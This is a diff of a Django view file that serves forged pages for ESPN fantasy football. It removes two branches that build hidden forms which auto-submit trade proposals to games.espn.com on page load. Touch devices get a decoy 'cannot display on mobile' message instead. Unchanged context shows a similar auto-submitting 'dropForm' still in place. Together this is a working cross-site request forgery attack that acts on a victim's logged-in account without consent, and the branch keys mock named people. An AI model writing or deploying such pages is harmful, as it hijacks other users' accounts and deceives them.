@@ -4,7 +4,7 @@ from django.core.mail import EmailMessage
 from django.template.loader import get_template
 from django.template import Context
 
-WEEK = '16'
+WEEK = '5'
 
 MAPPINGS = {
 	'Uncle Drew':'1210475',
@@ -91,70 +91,6 @@ def dropPlayer(request,
             document.forms.dropForm.submit();\n\
             //document.getElementById("header").innerHTML = "not a touch screen, prime";\n}\n })</script>'
 
-    if decoyText == "kirk+scared+of+disabled+child":
-        url = "games.espn.com/ffl/trade?leagueId="+leagueId
-        html = '<html><form name="proposeTradeForm" enctype="application/x-www-form-urlencoded" method="POST" action="http://'+url+'">\
-                <h1 id="header"></h1>\
-                <input type="hidden" value="1" name="incoming">\
-                <input type="hidden" value="13" name="teamId">\
-                <input type="hidden" value="4_17921_13_2_2_20" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="4_17919_2_2_13_20" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="2" name="expireTime">\
-                <input type="hidden" value="" name="mailText">\
-                <input style="display:none" type="submit" value="submit"></form></html>'
-        js = '<script>\ndocument.addEventListener("DOMContentLoaded", function(){\n\
-            if("ontouchstart" in document.documentElement){\n\
-            document.getElementById("header").innerHTML = "Content could not be displayed on mobile device. Please try on a desktop browser";}\n\
-            else{ \n\
-            document.forms.proposeTradeForm.submit();\n\
-            //document.getElementById("header").innerHTML = "not a touch screen, prime";\n}\n })</script>'
-    if decoyText == "kirk+scared+of+disabled+matt":
-        url = "games.espn.com/ffl/trade?leagueId="+leagueId
-        html = '<html><form name="proposeTradeForm" enctype="application/x-www-form-urlencoded" method="POST" action="http://'+url+'">\
-                <h1 id="header"></h1>\
-                <input type="hidden" value="1" name="incoming">\
-                <input type="hidden" value="13" name="teamId">\
-                <input type="hidden" value="4_17921_13_2_6_20" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="4_14885_6_2_13_20" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="" name="rostermove">\
-                <input type="hidden" value="2" name="expireTime">\
-                <input type="hidden" value="" name="mailText">\
-                <input style="display:none" type="submit" value="submit"></form></html>'
-        js = '<script>\ndocument.addEventListener("DOMContentLoaded", function(){\n\
-            if("ontouchstartasdf" in document.documentElement){\n\
-            document.getElementById("header").innerHTML = "Content could not be displayed on mobile device. Please try on a desktop browser";}\n\
-            else{ \n\
-            document.forms.proposeTradeForm.submit();\n\
-            //document.getElementById("header").innerHTML = "not a touch screen, prime";\n}\n })</script>'
     return HttpResponse(html+js)
 
 def sendTradeVote(request):
